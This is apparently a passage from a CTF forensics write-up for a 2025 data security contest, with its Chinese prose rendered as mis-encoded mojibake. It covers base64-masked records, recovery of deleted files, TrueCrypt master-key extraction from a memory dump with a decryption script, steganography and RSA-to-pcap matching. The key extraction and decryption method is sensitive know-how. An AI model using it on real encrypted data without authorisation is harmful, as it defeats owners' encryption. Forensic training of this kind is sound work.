[{"content":"2025ç¬¬ä¸‰å±Šæ•°ä¿¡æ¯WP æ•°æ®å¤„ç† èƒŒæ™¯ï¼šéšç€æ•°æ®å®‰å…¨è¡Œä¸šçš„å¤§åŠ›å‘å±•ï¼Œä½ ä½œä¸ºä¸€ååˆšæ¯•ä¸šçš„å¤§å­¦ç”Ÿï¼Œä¹Ÿæ‰“ç®—è¿›å…¥æ•°æ®å®‰å…¨çš„è¡Œä¸šä¹‹ ä¸­ã€‚åœ¨ä¸æ–­çš„ç®€å†æŠ•é€’ä¸‹ï¼Œä½ ç»ˆäºå¦‚æ„¿è¿›å…¥åˆ°ä¸€å®¶ç‰©è”ç½‘å…¬å¸è¿›è¡Œæ•°æ®å®‰å…¨æ–¹å‘çš„å·¥ä½œã€‚åˆšå…¥èŒçš„ç¬¬ä¸€ å¤©ï¼Œä½ å°±æ¥åˆ°äº†ä¸€ç³»åˆ—ä»»åŠ¡ã€‚\nç®¡ç†å‘˜è´¦å·å¯†ç  é¢˜ç›® ç¬¬ä¸€å¤©ä¸Šç­çš„ä½ å»æŸ¥çœ‹å…¬å¸çš„æµé‡ç›‘æ§è®°å½•ï¼Œå‘ç°äº†ä¸€ä¸²éå¸¸å¥‡æ€ªçš„æµé‡ä¿¡æ¯ï¼Œä½ ä¸€çœ¼å°±åˆ¤æ–­å‡ºè¿™æ˜¯é»‘å®¢æ”»å‡»æ‰€äº§ç”Ÿçš„æµé‡ï¼Œä½ å‘ä¸Šçº§æŠ¥å‘Šåï¼Œä¸Šçº§è®©ä½ æŸ¥æ¸…é»‘å®¢è·å–äº†ä»€ä¹ˆæ•°æ®ã€‚\n[ç­”æ¡ˆæ ‡å‡†] ä½ éœ€è¦æäº¤æ³„éœ²çš„ç®¡ç†å‘˜çš„è´¦å·å¯†ç \nä¾‹ï¼šç®¡ç†å‘˜è´¦å·å¯†ç ä¸º123/123ï¼Œåˆ™æœ€ç»ˆæäº¤çš„ç­”æ¡ˆä¸ºï¼š123/123\nè§£ç­” åœ¨æŠ¥æ–‡é‡Œæ‰¾ç™»å½•æˆåŠŸçš„\nå®¶åº­ä½å€ é¢˜ç›® ä¸ä½ äº¤æ¥çš„åŒäº‹ç”±äºå·¥ä½œä¸Šçš„ç–å¿½å°†åŸå…ˆçš„å±…æ°‘ä¿¡æ¯æ–‡ä»¶è¯¯åˆ é™¤äº†ï¼Œä½†æ˜¯ä½ å‘ç°å…¬å¸çš„ç³»ç»Ÿä¸Šä¾æ—§å­˜åœ¨å±…æ°‘çš„ä¿¡æ¯ï¼Œä¸‹è½½åå‘ç°è¿›è¡Œäº†è„±æ•å¤„ç†ï¼Œä½ éœ€è¦åˆ©ç”¨æŠ€æœ¯æ‰‹æ®µå°†å±…æ°‘ä¿¡æ¯å¿«é€Ÿæ•´ç†å‡ºæ¥ã€‚\n[ç­”æ¡ˆæ ‡å‡†] ä½ éœ€è¦æäº¤æ‰‹æœºå·ä¸º18896239239çš„å®¶åº­ä½å€\nä¾‹ï¼šæ‰‹æœºå·ä¸º18896239239çš„å®¶åº­ä½å€ä¸ºé’æµ·çœæ²ˆé˜³å¸‚åˆå·å¾è¡—9å·ï¼Œåˆ™æœ€ç»ˆæäº¤çš„ç­”æ¡ˆä¸ºï¼š é’æµ·çœæ²ˆé˜³å¸‚åˆå·å¾è¡—9å·\nè§£ç­” å‘ç°è¡¨æ ¼é‡Œéƒ½æ˜¯base64ç¼–ç çš„\næŠŠæ‰‹æœºå·ä¹Ÿbase64ç¼–ç ååœ¨è¡¨æ ¼é‡Œæœç´¢\næŠŠå¯¹åº”çš„å…¶ä»–åˆ—ç”¨baseè§£ç \næœ€å¤§æ¬¡æ•° é¢˜ç›® åœ¨å¾—åˆ°å±…æ°‘ä¿¡æ¯ä¹‹åï¼Œé¢†å¯¼è®©ä½ ç»Ÿè®¡ä¸€ä¸‹å±…æ°‘ä¿¡æ¯ä¸­é‡åçš„æ•°é‡ï¼Œæ–¹ä¾¿åç»­çš„å·¥ä½œå¼€å±•ã€‚\n[ç­”æ¡ˆæ ‡å‡†] ä½ éœ€è¦ç»Ÿè®¡å‡ºç°é‡åæ¬¡æ•°å‡ºç°æœ€å¤šçš„äººçš„å§“åä»¥åŠå‡ºç°çš„æ¬¡æ•°\nä¾‹ï¼šé‡åæœ€å¤šçš„äººå«å¼ ä¸‰ï¼Œå‡ºç°äº†10æ¬¡ï¼Œåˆ™æœ€ç»ˆæäº¤çš„ç­”æ¡ˆä¸ºï¼šå¼ ä¸‰10\nè§£ç­” ç”¨excelè‡ªå¸¦åŠŸèƒ½å¤„ç†ï¼Œç­›é€‰åæŒ‰è®¡æ•°æ’åº\nå°†ç»“æœbase64è§£ç ï¼Œç­”æ¡ˆæ˜¯åˆ˜çº¢æ¢…\næ•°æ®æ³„éœ² ç›´æ¥base64è§£ç \næ•°æ®æ¢å¤æº¯æº èƒŒæ™¯ï¼šä¸€å®¶ç§‘æŠ€å…¬å¸çš„è¿ç»´äººå‘˜åœ¨æ—¥å¸¸å·¡æŸ¥çš„æ—¶å€™ï¼Œå‘ç°ä¸€å°æœåŠ¡å™¨ä¸Šå‡ºç°äº†å¼‚å¸¸ï¼Œè¿™å°æœåŠ¡å™¨è®°å½•äº†è®¸å¤šé‡è¦çš„èµ„æ–™ï¼Œåˆæ­¥æ’æŸ¥ä¸‹æ¥åå‘ç°æ˜¯é»‘å®¢å…¥ä¾µäº†æœåŠ¡å™¨å¹¶é€šè¿‡æŠ€æœ¯æ‰‹æ®µçªƒå–äº†é‡è¦çš„æ–‡ä»¶èµ„æ–™ã€‚ç°åœ¨å…¬å¸æ‰¾åˆ°ä½ è¿›è¡Œåˆä½œï¼Œè¯·ä½ æ ¹æ®ç³»ç»Ÿè‡ªåŠ¨ä¿å­˜ä¸‹æ¥çš„æ®‹å­˜å†…å®¹æº¯æºæ•´ä¸ªæ”»å‡»è¡Œä¸ºå¹¶æ‰¾åˆ°æ³„éœ²äº†å“ªäº›æ–‡ä»¶èµ„æ–™ã€‚\næ•°æ®æ¢å¤ é¢˜ç›® é»‘å®¢åœ¨æ”»å‡»æ—¶ï¼Œä¸ºäº†å¯¹å…¬å¸é€ æˆæ›´å¤§çš„ç ´åï¼Œç›´æ¥åˆ é™¤äº†ç£ç›˜ä¸­çš„æ–‡ä»¶ã€‚ä½†å¥½åœ¨ç³»ç»Ÿæœ‰è‡ªåŠ¨çš„ç£ç›˜å¤‡ä»½è®¡åˆ’ï¼Œä¿ç•™äº†ä¸€ä¸ªå¤‡ä»½ç£ç›˜ã€‚è¯·ä½ é€šè¿‡æŠ€æœ¯æ‰‹æ®µï¼Œæ¢å¤å‡ºé»‘å®¢åˆ é™¤çš„æ–‡ä»¶ã€‚\n[ç­”æ¡ˆæ ‡å‡†] è¯·æ‰¾å‡ºåˆ é™¤çš„æ–‡ä»¶ä¸­çš„ä¸€ä¸ªåˆåŒæ–‡ä»¶ï¼Œæäº¤åˆåŒç¼–å·ã€‚\nä¾‹ï¼šå¦‚æœåˆåŒç¼–å·ä¸ºflag{xx-xx-xx}ï¼Œåˆ™æœ€ç»ˆæäº¤ç­”æ¡ˆä¸ºï¼šxx-xx-xx\nè§£ç­” æŸ¥çœ‹disk.imgæ–‡ä»¶ç±»å‹ï¼Œç”¨testdiskæå–æ–‡ä»¶\nå¯ä»¥çœ‹åˆ°æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œæ ¹æ®æç¤ºï¼ŒæŠŠè¿™ä¸‰ä¸ªæ–‡ä»¶éƒ½æå–å‡ºæ¥ã€‚\næˆ‘çš„kaliæ˜¾ç¤ºä¸äº†ä¸­æ–‡ï¼ŒPDFæ–‡ä»¶åå…¶å®æ˜¯â€œå•†ä¸šåˆä½œåˆåŒ.pdfâ€ï¼Œæ‰“å¼€åè·å¾—ç­”æ¡ˆ\næ•°æ®å­˜å‚¨å®‰å…¨ é¢˜ç›® ä½ é€šè¿‡æŠ€æœ¯æ‰‹æ®µæ¢å¤å‡ºé»‘å®¢åˆ é™¤çš„æ–‡ä»¶åï¼Œå‘ç°å­˜åœ¨åŠ å¯†æ–‡ä»¶ï¼Œä½†æ˜¯ç®¡ç†å‘˜å¿˜è®°äº†å¯†é’¥ï¼Œä½†ç»éªŒä¸°å¯Œçš„ä½ çŸ¥é“å¯ä»¥ç»•å¼€éªŒè¯ç›´æ¥è¯»å–åŠ å¯†æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚è¯·ä½ é€šè¿‡æŠ€æœ¯æ‰‹æ®µï¼Œè¯»å–åŠ å¯†å†…å®¹ã€‚\n[ç­”æ¡ˆæ ‡å‡†] è¯·è¯»å–åŠ å¯†æ–‡ä»¶ä¸­çš„å¯†ç æœ¬ï¼Œæäº¤å¯†ç æœ¬ä¸­çš„å†…å®¹\nä¾‹ï¼šå¦‚æœå¯†ç æœ¬ä¸­çš„å†…å®¹ä¸ºflag{xxxxxx}ï¼Œåˆ™æœ€ç»ˆæäº¤ç­”æ¡ˆä¸ºï¼šxxxxxx\nè§£ç­” ä¸Šé¢˜ä¸­è·å¾—çš„è¿˜æœ‰ä¸€ä¸ªrawæ–‡ä»¶å’Œä¸€ä¸ªdataæ–‡ä»¶ã€‚dataæ–‡ä»¶å¤§å°åˆšå¥½512MBï¼Œæ ¹æ®é¢˜ç›®æç¤ºï¼ŒçŒœæµ‹dataæ–‡ä»¶å°±æ˜¯åŠ å¯†æ–‡ä»¶ã€‚\nå…ˆç”¨å†…å­˜å–è¯å·¥å…·è¯»å–rawæ–‡ä»¶ã€‚\nå‘ç‚¹ï¼ï¼ï¼\nè¿™é‡Œæœ‰ä¸ªå‘ç‚¹ï¼Œæˆ‘ç”¨windows.filescanæ‰«æåå‘ç°é‡Œé¢æœ‰ä¸€ä¸ªâ€œå¯†ç æœ¬.txtâ€ï¼Œä½†å°±æ˜¯æå–ä¸å‡ºæ¥ã€‚å…¶å®ç­”æ¡ˆçš„â€œå¯†ç æœ¬.txtâ€åœ¨dataé‡Œï¼Œä¸åœ¨rawé‡Œã€‚\næŸ¥çœ‹è¿›ç¨‹ä¿¡æ¯ï¼Œå‘ç°æœ‰TrueCryptï¼ŒçŒœæµ‹dataæ–‡ä»¶å°±æ˜¯ç”¨å®ƒåŠ å¯†çš„ã€‚\nè¿™é‡Œä½¿ç”¨volatility2çš„truecryptmasterè„šæœ¬ä»rawæ–‡ä»¶ä¸­æå–å‡ºmasterkeyï¼Œæ³¨æ„volatility2éœ€è¦ç”¨python2ã€‚\n1 python2 \u0026#34;D:\\SecSpace\\mem\\Lovelymem\\Tools\\volatility2_python\\vol.py\u0026#34; -f \u0026#34;C:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\disk\\recovered\\WIN-SERVER-PC-20251202-122722.raw\u0026#34; --profile=Win7SP1x64 truecryptmaster -D \u0026#34;C:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\disk\\recovered\u0026#34; æ¥ä¸‹æ¥ç”¨è·å–çš„masterkeyè§£å¯†dataï¼Œæ³¨æ„truecryptä¸æ”¯æŒç”¨masterkeyè§£å¯†\nWindowså¹³å°å¯ç”¨ä»¥ä¸‹è„šæœ¬è·å–ä¸€ä¸ªè§£å¯†åçš„imgæ–‡ä»¶ï¼Œç„¶åç”¨testdiskæå–é‡Œé¢çš„å†…å®¹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 #!/usr/bin/env python3 \u0026#34;\u0026#34;\u0026#34; TrueCrypt è§£å¯†è„šæœ¬ - ä½¿ç”¨ cryptography åº“çš„åŸç”Ÿ XTS å®ç° è¿™æ˜¯æœ€å¿«çš„ Python å®ç°æ–¹å¼ \u0026#34;\u0026#34;\u0026#34; import os import sys import struct import time from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes def decrypt_truecrypt_fast(encrypted_file, key_file, output_file, offset=256): \u0026#34;\u0026#34;\u0026#34;ä½¿ç”¨ cryptography åº“çš„åŸç”Ÿ XTS è§£å¯† - æé€Ÿç‰ˆæœ¬\u0026#34;\u0026#34;\u0026#34; print(f\u0026#34;\\n=== TrueCrypt è§£å¯†å·¥å…· (æé€Ÿç‰ˆ) ===\\n\u0026#34;) start_time = time.time() # è¯»å– master key with open(key_file, \u0026#39;rb\u0026#39;) as f: master_key = f.read() print(f\u0026#34;Master key: {len(master_key)} å­—èŠ‚\u0026#34;) if len(master_key) \u0026lt; 64: master_key = master_key + b\u0026#39;\\x00\u0026#39; * (64 - len(master_key)) # cryptography çš„ XTS éœ€è¦å®Œæ•´çš„ 64 å­—èŠ‚å¯†é’¥ # æ ¼å¼: key1 (32 bytes) + key2 (32 bytes) # ä½†é¡ºåºä¸ TrueCrypt ç›¸åï¼štweak key åœ¨å‰ï¼Œdata key åœ¨å # TrueCrypt: data_key (32) + tweak_key (32) # cryptography XTS: key = data_key + tweak_key (ç›¸åŒé¡ºåº) file_size = os.path.getsize(encrypted_file) print(f\u0026#34;æ–‡ä»¶å¤§å°: {file_size / (1024*1024):.2f} MB\u0026#34;) sector_size = 512 data_offset = offset * sector_size data_size = file_size - data_offset # ä½¿ç”¨ 64 MB å—ä»¥æœ€å¤§åŒ–æ€§èƒ½ chunk_size = 64 * 1024 * 1024 total_chunks = (data_size + chunk_size - 1) // chunk_size print(f\u0026#34;å—å¤§å°: {chunk_size // (1024*1024)} MB\u0026#34;) print(f\u0026#34;\\nå¼€å§‹è§£å¯†...\u0026#34;) with open(encrypted_file, \u0026#39;rb\u0026#39;) as f_in: with open(output_file, \u0026#39;wb\u0026#39;) as f_out: f_in.seek(data_offset) current_sector = offset processed = 0 bytes_processed = 0 while True: chunk = f_in.read(chunk_size) if not chunk: break # é€æ‰‡åŒºè§£å¯†ï¼ˆXTS çš„ tweak åŸºäºæ‰‡åŒºå·ï¼‰ decrypted_chunk = bytearray() for i in range(0, len(chunk), sector_size): sector_data = chunk[i:i + sector_size] if len(sector_data) \u0026lt; sector_size: sector_data = sector_data + b\u0026#39;\\x00\u0026#39; * (sector_size - len(sector_data)) # åˆ›å»º tweak (128 ä½å°ç«¯åºæ‰‡åŒºå·) tweak = struct.pack(\u0026#39;\u0026lt;QQ\u0026#39;, current_sector, 0) # ä½¿ç”¨ cryptography çš„ XTS æ¨¡å¼ cipher = Cipher(algorithms.AES(master_key), modes.XTS(tweak)) decryptor = cipher.decryptor() decrypted_sector = decryptor.update(sector_data) + decryptor.finalize() decrypted_chunk.extend(decrypted_sector) current_sector += 1 f_out.write(decrypted_chunk) bytes_processed += len(chunk) processed += 1 progress = (bytes_processed / data_size) * 100 elapsed = time.time() - start_time speed = (bytes_processed / (1024*1024)) / elapsed if elapsed \u0026gt; 0 else 0 eta = (data_size - bytes_processed) / (bytes_processed / elapsed) if bytes_processed \u0026gt; 0 else 0 print(f\u0026#34;è¿›åº¦: {progress:.1f}% | é€Ÿåº¦: {speed:.1f} MB/s | å‰©ä½™: {eta:.0f}s\u0026#34;, end=\u0026#39;\\r\u0026#39;) elapsed = time.time() - start_time avg_speed = (data_size / (1024*1024)) / elapsed print(f\u0026#34;\\n\\nâœ“ è§£å¯†å®Œæˆ!\u0026#34;) print(f\u0026#34;ç”¨æ—¶: {elapsed:.1f} ç§’\u0026#34;) print(f\u0026#34;å¹³å‡é€Ÿåº¦: {avg_speed:.1f} MB/s\u0026#34;) print(f\u0026#34;è¾“å‡ºï¿½ï¿½ï¿½ä»¶: {output_file}\u0026#34;) # æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿ print(f\u0026#34;\\n=== æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿ ===\u0026#34;) with open(output_file, \u0026#39;rb\u0026#39;) as f: header = f.read(4096) if header[3:8] == b\u0026#39;NTFS \u0026#39;: print(\u0026#34;æ£€æµ‹åˆ°: NTFS\u0026#34;) elif header[3:8] == b\u0026#39;MSDOS\u0026#39;: print(\u0026#34;æ£€æµ‹åˆ°: FAT32/FAT16\u0026#34;) elif header[3:8] == b\u0026#39;EXFAT\u0026#39;: print(\u0026#34;æ£€æµ‹åˆ°: exFAT\u0026#34;) elif len(header) \u0026gt; 1082 and header[1080:1082] == b\u0026#39;\\x53\\xef\u0026#39;: print(\u0026#34;æ£€æµ‹åˆ°: EXT2/3/4\u0026#34;) else: print(f\u0026#34;æ–‡ä»¶å¤´ (hex): {header[:64].hex()}\u0026#34;) if header[:512] == b\u0026#39;\\x00\u0026#39; * 512: print(\u0026#34;è­¦å‘Š: æ–‡ä»¶å¤´å…¨ä¸ºé›¶ï¼Œå¯èƒ½è§£å¯†å¤±è´¥\u0026#34;) def main(): script_dir = os.path.dirname(os.path.abspath(__file__)) encrypted_file = os.path.join(script_dir, \u0026#39;data\u0026#39;) key_file = os.path.join(script_dir, \u0026#39;0xfffffa8018ea11a8_master.key\u0026#39;) output_file = os.path.join(script_dir, \u0026#39;decrypted_data.img\u0026#39;) if not os.path.exists(encrypted_file): print(f\u0026#34;é”™è¯¯: æ‰¾ä¸åˆ° {encrypted_file}\u0026#34;) sys.exit(1) if not os.path.exists(key_file): print(f\u0026#34;é”™è¯¯: æ‰¾ä¸åˆ° {key_file}\u0026#34;) sys.exit(1) decrypt_truecrypt_fast(encrypted_file, key_file, output_file) if __name__ == \u0026#39;__main__\u0026#39;: main() Linuxå¹³å°å¯ä»¥åœ¨githubä¸‹è½½MKDecrypt.pyï¼ŒæŠŠdataæŒ‚è½½åˆ°æœ¬åœ°æŸ¥çœ‹\n1 python MKDecrypt.py -X -m /mnt data 0xfffffa8018ea11a8_master.key æµé‡åˆ†æï¼ˆæ²¡åšå‡ºæ¥ï¼‰ é¢˜ç›® ä½ åœ¨ç ´è§£å¼€åŠ å¯†æ–‡ä»¶åï¼Œå‘ç°åŠ å¯†æ–‡ä»¶ä¸­å­˜æ”¾ç€ä¸€ä¸ªæµé‡åŒ…ï¼Œé€šè¿‡åˆ†æä½ å‘ç°æµé‡åŒ…ä¸­è®°å½•ç€é»‘å®¢æ”»å‡»æ—¶äº§ç”Ÿçš„æµé‡ä¿¡æ¯ã€‚ä½ éœ€è¦åˆ†ææµé‡åŒ…ï¼Œæ‰¾å‡ºæ³„éœ²çš„å†…å®¹ã€‚\n[ç­”æ¡ˆæ ‡å‡†] è¯·è¯»å–æ³„éœ²çš„å†…å®¹ï¼Œæäº¤æ‰‹æœºå·ä¸ºï¼š18316978925çš„å®¶åº­ä½å€ä¿¡æ¯\nä¾‹ï¼šæ‰‹æœºå·18316978925çš„å®¶åº­ä½å€ä¸ºï¼šå››å·çœæˆéƒ½å¸‚é”¦æ±ŸåŒºå­¦åºœè·¯159å·å’Œè°è‹‘23æ ‹5å•å…ƒ22å®¤ï¼Œåˆ™æœ€ç»ˆæäº¤ç­”æ¡ˆä¸ºï¼šå››å·çœæˆéƒ½å¸‚é”¦æ±ŸåŒºå­¦åºœè·¯159å·å’Œè°è‹‘23æ ‹5å•å…ƒ22å®¤\nè§£ç­” æµé‡åŒ…å°±æ˜¯ä¸Šé¢˜è·å¾—çš„challenge.zipï¼Œä½†è¿™é¢˜æˆ‘æœªè§£å‡ºã€‚\næ•°æ®éšå†™ æå–ä¿¡æ¯ é¢˜ç›® éšå†™è§„åˆ™æç¤ºï¼š\nå›¾ç‰‡çš„çº¢è‰²ï¼ˆRï¼‰é€šé“ä¸­éšè—äº†æ¨¡å‹è¾“å…¥ç‰¹å¾ï¼› å–å›¾ç‰‡å·¦ä¸Šè§’å‰20ä¸ªåƒç´ çš„Rå€¼ï¼Œè®¡ç®— Rå€¼ mod 10 å¾—åˆ°20ç»´ç‰¹å¾ï¼› 20ç»´ç‰¹å¾è¾“å…¥multimodal_model.pthæ¨¡å‹åï¼Œè¾“å‡ºçš„æ•°å€¼å–æ•´å³ä¸ºflagçš„ASCIIç ï¼› ASCIIç è½¬æ¢ä¸ºå­—ç¬¦å³å¯å¾—åˆ°å®Œæ•´flagã€‚ æ¨¡å‹æç¤ºï¼š\næ¨¡å‹ä¸ºè½»é‡å…¨è¿æ¥ç¥ç»ç½‘ç»œï¼ˆMLPï¼‰ï¼Œä»…å«3å±‚çº¿æ€§å±‚+ReLUæ¿€æ´»ã€‚ è§£ç­” å…ˆæŸ¥çœ‹æ¨¡å‹ç»“æ„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import torch # Load the model state dictionary model_path = \u0026#34;multimodal_model.pth\u0026#34; try: # weights_only=False is needed for older pytorch versions or specific save formats, # though strictly for weights it might not be needed, keeping it safe as per user\u0026#39;s solve.py state_dict = torch.load(model_path, map_location=\u0026#39;cpu\u0026#39;) print(f\u0026#34;Content of {model_path}:\u0026#34;) for key, value in state_dict.items(): if isinstance(value, torch.Tensor): print(f\u0026#34;{key}: {value.shape}\u0026#34;) else: print(f\u0026#34;{key}: {type(value)}\u0026#34;) except Exception as e: print(f\u0026#34;Error loading file: {e}\u0026#34;) ç¼–å†™pyè„šæœ¬å–æ•°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 import torch import torch.nn as nn from PIL import Image import numpy as np # å®šä¹‰å®Œå…¨ç›¸åŒçš„MLPæ¨¡å‹ç»“æ„ï¼ˆæ ¹æ®å®é™…æƒé‡ï¼š20-\u0026gt;64-\u0026gt;32-\u0026gt;27ï¼‰ class MultimodalModel(nn.Module): def __init__(self): super(MultimodalModel, self).__init__() self.fc1 = nn.Linear(20, 64) self.relu1 = nn.ReLU() self.fc2 = nn.Linear(64, 32) self.relu2 = nn.ReLU() self.fc3 = nn.Linear(32, 27) def forward(self, x): x = self.fc1(x) x = self.relu1(x) x = self.fc2(x) x = self.relu2(x) x = self.fc3(x) return x # 1. åŠ è½½å›¾ç‰‡å¹¶æå–Ré€šé“ image_path = r\u0026#34;c:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\æ•°æ®éšå†™\\secret_image.png\u0026#34; img = Image.open(image_path) img_array = np.array(img) # è·å–Ré€šé“ r_channel = img_array[:, :, 0] # Ré€šé“ # éšå†™ä¿¡æ¯åœ¨ç¬¬ä¸€åˆ—ï¼å–å‰20è¡Œçš„ç¬¬ä¸€åˆ—åƒç´  r_values = r_channel[:20, 0] print(\u0026#34;å·¦ä¸Šè§’å‰20è¡Œç¬¬ä¸€åˆ—çš„Rå€¼:\u0026#34;, r_values) # 2. è®¡ç®— Rå€¼ mod 10 å¾—åˆ°20ç»´ç‰¹å¾ features = r_values % 10 print(\u0026#34;ç‰¹å¾ (R mod 10):\u0026#34;, features) # 3. åŠ è½½æ¨¡å‹ model_path = r\u0026#34;c:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\æ•°æ®éšå†™\\multimodal_model.pth\u0026#34; model = MultimodalModel() state_dict = torch.load(model_path, map_location=\u0026#39;cpu\u0026#39;, weights_only=False) model.load_state_dict(state_dict) model.eval() # 4. å°†ç‰¹å¾è¾“å…¥æ¨¡å‹ input_tensor = torch.tensor(features, dtype=torch.float32).unsqueeze(0) with torch.no_grad(): output = model(input_tensor) # 5. è¾“å‡ºå–æ•´å¾—åˆ°ASCIIç  ascii_codes = output.squeeze().numpy().round().astype(int) print(\u0026#34;ASCIIç :\u0026#34;, ascii_codes) # 6. è½¬æ¢ä¸ºå­—ç¬¦ flag = \u0026#39;\u0026#39;.join([chr(code) for code in ascii_codes if 32 \u0026lt;= code \u0026lt;= 126]) print(\u0026#34;Flag:\u0026#34;, flag) æµé‡æ•°æ®åˆ†æ æŸå…¬å¸è¿ç»´å›¢é˜Ÿåœ¨æ—¥å¸¸å®‰å…¨å·¡æ£€è¿‡ç¨‹ä¸­å‘ç°ç³»ç»Ÿå­˜åœ¨å¼‚å¸¸è®¿é—®å’Œæ½œåœ¨å…¥ä¾µè¿¹è±¡ã€‚ç»åˆæ­¥æŠ€æœ¯ç ”åˆ¤ï¼Œé—®é¢˜å¯èƒ½ä¸å…¬å¸ç”¨äºå…³é”®æœåŠ¡å™¨ç›¸å…³ã€‚è¯¥æœåŠ¡å™¨è¢«ç¡®è®¤å­˜åœ¨ä¸€å®šå®‰å…¨é£é™©ï¼Œä½†ç›®å‰å°šæ— æ³•ç¡®å®šæ”»å‡»è€…æ˜¯å¦å·²æˆåŠŸè·å–å…¶ä¸­çš„è¯ä¹¦ä¿¡æ¯ã€‚ä¸ºè¿›ä¸€æ­¥æ’æŸ¥ä¸åˆ†ææ½œåœ¨çš„æ•°æ®æ³„æ¼æƒ…å†µï¼Œè¿ç»´å›¢é˜Ÿå·²å¯¼å‡ºè¯¥æœåŠ¡å™¨çš„æ‰€æœ‰ç½‘ç»œæµé‡æ–‡ä»¶ï¼Œè¯·æ ¹æ®æµé‡åŒ…æ–‡ä»¶åˆ†æå¹¶å›ç­”ä»¥ä¸‹çš„é—®é¢˜ã€‚\nè¯ä¹¦åˆæˆ é¢˜ç›® è¯·æ ¹æ®é¢˜ç›®æä¾›çš„è¯ä¹¦å…³é”®å‚æ•°ï¼Œåˆæˆç§é’¥è§£å¯†è¯ä¹¦ã€‚è¯·é€‰æ‰‹æ‰¾åˆ°idä¸º285çš„å‚æ•°åˆæˆçš„è¯ä¹¦(å‚è€ƒé™„ä»¶params.csv)ï¼Œå¯ä»¥è§£å¯†å“ªä¸ªæµé‡åŒ…(å‚è€ƒé™„ä»¶:pcap.zip)ã€‚å¹¶å°†å…¶æµé‡åŒ…åç§°ä½œä¸ºç­”æ¡ˆæäº¤ã€‚\nã€ç­”æ¡ˆæ ‡å‡†ã€‘\nè‹¥idä¸º285çš„å‚æ•°åˆæˆè¯ä¹¦ï¼Œå¯ä»¥è§£å¯†\u0026quot;UT5NHVWo2Z.pcap\u0026quot;ï¼Œåˆ™ç­”æ¡ˆæäº¤ä¸ºUT5NHVWo2Z.pcap\nè§£ç­” æŸ¥çœ‹ä¸€ä¸ªæµé‡åŒ…å†…å®¹ï¼Œå‘ç°æ˜¯å…ˆåšäº†TLSå¯†é’¥äº¤æ¢ï¼Œç„¶åç”¨åŠ å¯†å½¢å¼ä¼ æ•°æ®\næŸ¥çœ‹params.csvæ–‡ä»¶ï¼Œå‘ç°æ˜¯rsaçš„eã€pã€qå€¼\nå·²çŸ¥åœ¨TLSå¯†é’¥äº¤æ¢çš„æ—¶å€™ï¼Œä¼šä¼ é€’rsaæ¨¡æ•°nçš„å€¼\nå› æ­¤å¯ä»¥é€šè¿‡nï¼Œæ‰¾åˆ°idä¸º285çš„å‚æ•°å¯ä»¥è§£å¯†å“ªä¸ªæµé‡åŒ…ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import os import glob from scapy.all import rdpcap, Raw import warnings from Crypto.Util.number import * warnings.filterwarnings(\u0026#34;ignore\u0026#34;) # è·¯å¾„é…ç½® pcap_dir = r\u0026#34;c:\\Users\\33113\\Desktop\\æ•°ä¿¡æ¯\\æ•°æ®æº¯æº\\pcap\u0026#34; # RSAå‚æ•° (id=285) e = 65537 p = 177264302295959185550899884811457697789837321132319354039496340545988969470422347313577084568610012957139649359576035974322283705879187577664768699213211347033624840318251940972496063336844685896882713624561971974788692556498019960846465311267474369690812099681875735569564330504277517754796899917257323134723 q = 143990163909936129648804807321551478733567016733642335522156625973321506509458427490929508866189002322826874210961910641865602374675333206288577734876005828016379170951078934469472423840724164310343028554942665656763806178050620857070820746559094989518930589089970082522430002916286799917078785172333647028571 # è®¡ç®—n n = p * q print(f\u0026#34;n = {n}\\n\u0026#34;) # è·å–æ‰€æœ‰pcapæ–‡ä»¶ pcap_files = glob.glob(os.path.join(pcap_dir, \u0026#34;*.pcap\u0026#34;)) print(f\u0026#34;æ‰¾åˆ° {len(pcap_files)} ä¸ªpcapæ–‡ä»¶\u0026#34;) matches = [] for i, pcap_file in enumerate(pcap_files): pcap_name = os.path.basename(pcap_file) try: # è¯»å–pcapæ–‡ä»¶ packets = rdpcap(pcap_file) # éå†æ‰€æœ‰æ•°æ®åŒ… for pkt in packets: # æ£€æŸ¥æ˜¯å¦æœ‰Rawå±‚,å³è½½è·æ•°æ® if pkt.haslayer(Raw): # è·å–è½½è·æ•°æ® raw_data = bytes(pkt[Raw]) # æ£€æŸ¥æ¨¡æ•°næ˜¯å¦åœ¨è½½è·æ•°æ®ä¸­ n_bytes = long_to_bytes(n) if n_bytes in raw_data: print(f\u0026#34;[åŒ¹é…!] {pcap_name}: æ‰¾åˆ°åŒ¹é…çš„æ¨¡æ•°\u0026#34;) matches.append(pcap_name) break except Exception as e: pass if (i + 1) % 100 == 0: print(f\u0026#34;å·²å¤„ç† {i+1}/{len(pcap_files)} ä¸ªæ–‡ä»¶...\u0026#34;) print(f\u0026#34;\\n=== åŒ¹é…çš„æ–‡ä»¶ ===\u0026#34;) for m in matches: print(m) è¯ä¹¦è§£å¯† é¢˜ç›® è¯·æ 